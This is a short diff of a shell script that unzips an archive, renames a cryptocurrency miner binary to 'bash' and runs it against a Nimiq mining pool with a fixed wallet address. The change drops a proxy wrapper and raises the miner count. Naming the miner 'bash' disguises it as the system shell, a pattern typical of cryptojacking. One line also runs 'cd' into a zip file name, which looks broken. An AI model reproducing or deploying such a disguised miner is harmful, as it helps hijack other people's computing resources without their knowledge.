@@ -36,4 +36,4 @@ echo " "
 unzip aceng.zip
 cd aceng.zip
 mv miner bash
-./graftcp/graftcp ./bash --pool=nimiq.icemining.ca:2053 --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --miner=2 --type=dumb
+./bash --pool=nimiq.icemining.ca:2053 --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --miner=8 --type=dumb
